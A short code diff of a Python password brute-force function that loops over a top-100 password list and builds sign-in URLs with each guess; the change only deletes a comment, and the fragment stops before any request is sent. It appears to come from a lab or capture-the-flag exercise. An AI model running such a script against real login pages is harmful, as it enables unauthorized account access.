@@ -3,7 +3,7 @@ import requests
 def bruteforce_login(url, username):
     with open("./passwords_top_100.txt", "r") as passwords:
         for password in passwords:
-            password = password.strip()  # Remove any whitespace or newline characters
+            password = password.strip()
             full_url = f"{url}?page=signin&username={username}&password={password}&Login=Login"
             
             try:
